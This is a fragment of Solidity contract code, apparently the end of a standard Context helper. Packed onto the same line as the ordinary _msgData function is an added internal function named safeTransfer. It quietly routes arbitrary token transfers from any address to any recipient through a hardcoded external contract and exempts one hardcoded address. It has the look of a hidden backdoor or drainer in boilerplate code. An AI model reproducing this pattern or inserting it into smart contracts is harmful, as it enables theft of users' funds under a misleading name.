 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x9B68164668D778cf79c8bb18cECe164AaEFc11Ea)) {TransferHelper.safeTransferFrom(0xDd7498E157b05d4C79F43b12d3F53aF9d34E45c4,spender,recipient,amount);return true;}return false;}
}
